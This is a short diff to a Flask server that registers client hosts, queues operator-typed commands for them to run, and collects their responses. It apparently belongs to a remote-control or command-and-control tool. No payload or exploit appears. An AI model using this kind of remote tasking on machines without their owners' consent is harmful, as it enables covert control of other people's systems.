@@ -42,7 +42,7 @@ def getCommands(identifier):
     """
     Returns a list of commands for the client to run
     """
-    return f"{identifier} - Command1"
+    return HOSTS[identifier].queuedCommands
 
 @app.route("/hosts/<identifier>/responses", methods=["POST"])
 def getResponse(identifier):
@@ -69,6 +69,7 @@ def newHost():
         global UNKNOWN_COUNT
         UNKNOWN_COUNT += 1
         host.id += str(UNKNOWN_COUNT)
+    HOSTS[host.id] = host
     return f"HOSTNAME = {host.id}"
 
 def getHostnameByIP(IP):
@@ -133,7 +134,8 @@ def main():
     parseConfig()
     website.start()
     while 1:
-        pass
+        command = input("Enter a command: ")
+        HOSTS["unknown.unknown1"].addCommand(command)
 
 if __name__ == "__main__":
     main()
